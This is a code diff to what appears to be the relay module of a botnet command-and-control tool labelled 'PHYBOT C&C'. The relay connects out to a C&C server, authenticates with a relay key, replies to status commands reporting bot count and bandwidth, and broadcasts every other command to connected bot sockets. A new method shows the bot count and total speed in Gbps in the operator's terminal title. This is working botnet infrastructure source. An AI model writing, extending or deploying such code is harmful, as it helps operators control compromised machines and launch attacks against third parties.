@@ -1,4 +1,4 @@
-from time import sleep
+from time import sleep, asctime, localtime
 from socket import (
     socket as Sock,
     SOL_SOCKET,
@@ -7,57 +7,46 @@ from socket import (
     SOCK_STREAM,
 )
 from .config import RelayConfig
+from .core import Core
 
 class Relay():
     def __init__(
         self, 
+        core: Core,
         config: RelayConfig = RelayConfig()
     ) -> None:
+        self.core = core
         self.config = config
 
-    def log(
+    def update_title(
         self,
-        data: str,
-    ) -> None: 
-        if self.config.debug: print(data)
+        client: Sock,
+        username: str,
+    ):
+        while 1:
+            try:
+                bot_number: int = len(self.config.bots_sock)
+                total_speed: int = sum(self.config.bot_speed)/125000
+                actual_time: str = asctime(localtime())
+                self.core.send(client, f'\33]0;{username}@PHYBOT C&C  |  Bots: {bot_number}  |  Speed: {total_speed} Gbps  |  {actual_time}\a', False)
 
-    def send(
-        self,
-        s: Sock,
-        data: str,
-        escape: bool = True,
-        reset: bool = True,
-    ) -> None:
-        if reset: data += self.config.COLOR_RESET
-        if escape: data += '\r\n'
+                sleep(self.config.cnc_time.UPTITLE)
 
-        s.send(data.encode())
-
-    def broadcast(
-        self,
-        data: str,
-    ) -> None:
-        self.log(f"send {data}")
-
-        for bot in self.config.bots_sock.copy().keys():
-            try: self.send(bot, f'{data}', False, False)
-            except Exception:
-                self.config.bots_sock.pop(bot)
-                bot.close()
+            except Exception: client.close()
 
     def relay(self):
         c2: Sock = Sock(AF_INET, SOCK_STREAM)
         c2.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
 
-        self.log("relay starting...")
+        self.core.log("relay starting...")
         while 1:
             try:
                 c2.connect(self.config.cnc_addr.CNC_ADDR)
-                self.log("relay connecting to cnc ...")
+                self.core.log("relay connecting to cnc ...")
 
                 while 1:
                     data: str = c2.recv(1024).decode()
-                    self.log(f"relay recv: {[i for i in data]}")
+                    self.core.log(f"relay recv: {[i for i in data]}")
                     if 'Username' in data:
                         c2.send(f'RELAY[p:{self.config.RELAY_KEY}]'.encode())
                         break
@@ -68,11 +57,11 @@ class Relay():
                         c2.send(f'{self.config.RELAY_KEY}'.encode())
                         break
 
-                self.log("relay connected to cnc")
+                self.core.log("relay connected to cnc")
                 break
 
             except Exception:
-                self.log("relay offline, will retry later")
+                self.core.log("relay offline, will retry later")
                 sleep(self.config.relay_time.RELAY)
 
         while 1:
@@ -81,7 +70,7 @@ class Relay():
 
                 if not data: break
 
-                self.log(data)
+                self.core.log(data)
 
                 args: list[str] = data.split(' ')
                 command: str = args[0].upper()
@@ -90,7 +79,7 @@ class Relay():
                     case 'RPING': c2.send(f'RPONG[p:{self.config.RELAY_KEY}]'.encode())
                     case 'RNETSPEED': c2.send(str(self.config.bot_speed).encode())
                     case 'RNETBOTS': c2.send(str(len(self.config.bots_sock)).encode())
-                    case _: self.broadcast(data)
+                    case _: self.core.broadcast(data)
 
             except Exception: break
 
